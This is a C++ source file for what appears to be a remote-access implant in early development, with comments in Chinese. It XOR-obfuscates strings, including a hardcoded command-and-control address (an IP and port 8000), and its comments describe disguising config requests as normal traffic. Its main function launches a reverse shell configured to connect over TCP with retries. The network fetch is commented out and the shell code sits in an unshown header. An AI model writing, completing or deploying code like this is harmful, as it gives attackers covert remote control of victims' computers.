//define CPPHTTPLIB_OPENSSL_SUPPORT
#define xiran_string_maxlen 100
#define xiran_string_count 100
#define xiran_string std::array<char,xiran_string_maxlen>

#define DEBUG

#include<stdio.h>
#include<iostream>
//#include"include/httplib/httplib.h"
#include<string.h>
#include"shell.hpp"
#include<vector>

constexpr auto xiran_strlen(const char* str)
{
    int len = 0;
    for(int i=0;str[i];i++) len = i+1;
    return len;
}

//编译时处理
constexpr xiran_string init_xiran_string(const char* str)
{
    int len = xiran_strlen(str);
    if(len > xiran_string_maxlen) throw "[init_xiran_string] out of maxlen";

    char ret[xiran_string_maxlen]={0};
    for(int i=0;i<len;i++)
        ret[i] = str[i]^41;
    ret[len] = 0;

    #if xiran_string_maxlen == 100
        xiran_string res{ret[0],ret[1],ret[2],ret[3],ret[4],ret[5],ret[6],ret[7],ret[8],ret[9],ret[10],ret[11],ret[12],ret[13],ret[14],ret[15],ret[16],ret[17],ret[18],ret[19],ret[20],ret[21],ret[22],ret[23],ret[24],ret[25],ret[26],ret[27],ret[28],ret[29],ret[30],ret[31],ret[32],ret[33],ret[34],ret[35],ret[36],ret[37],ret[38],ret[39],ret[40],ret[41],ret[42],ret[43],ret[44],ret[45],ret[46],ret[47],ret[48],ret[49],ret[50],ret[51],ret[52],ret[53],ret[54],ret[55],ret[56],ret[57],ret[58],ret[59],ret[60],ret[61],ret[62],ret[63],ret[64],ret[65],ret[66],ret[67],ret[68],ret[69],ret[70],ret[71],ret[72],ret[73],ret[74],ret[75],ret[76],ret[77],ret[78],ret[79],ret[80],ret[81],ret[82],ret[83],ret[84],ret[85],ret[86],ret[87],ret[88],ret[89],ret[90],ret[91],ret[92],ret[93],ret[94],ret[95],ret[96],ret[97],ret[98],ret[99]};
    #else
        #error Please modify the code here
    #endif
    return res;
}

//单个字符串的最大长度为 xiran_string_maxlen1
xiran_string xiran_str[xiran_string_count]={
    init_xiran_string("http://47.109.186.209:8000"),
    init_xiran_string("test")
};

/*
解密字符串并返回
*/
std::unique_ptr<char[]> get_xiran_string(int index)
{
    if(index >= xiran_string_count) return NULL;
    std::unique_ptr<char[]> ret(new char[xiran_string_maxlen]);
    memset(ret.get(),0,xiran_string_maxlen);
    for(int i=0;xiran_str[index][i];i++)
        ret[i] = xiran_str[index][i]^41;
    return ret;
}

/*
从网站中获得配置信息
将请求伪装为正常流量
*/
void get_config()
{
    // httplib::Client cli2(get_xiran_string(0).get());
    // auto res2 = cli2.Get("/");
    // std::cout<<res2->status<<"\n";
    // std::cout<<res2->body<<"\n";


    //功能暂未实现，使用固定配置 

    const char config[] = "{\"version\":\"1.0\",\"cmdlines\":[\"cmd1\",\"cmd2\"],\"cmdIntervaltime\":123,\"Listening_port\":-1,\"updata_time\":-1,\"enable_shell\":true,\"shell_host\":\"127.0.0.1\",\"shell_port\":\"1234\",\"shell_protocol\":\"TCP\",\"retry_time\":10}";

    //解析配置文件
    analysis_xiran_config(config);

}

int main()
{
    // printf("%s\n",get_xiran_string(0).get());
    std::vector<std::thread> thread_vec;

    get_config();

    //启动反弹shell
    shell_start(thread_vec);


    //主线程阻塞
    for (size_t i = 0; i < thread_vec.size(); ++i) {
        thread_vec[i].join();
    }

    return 0;
}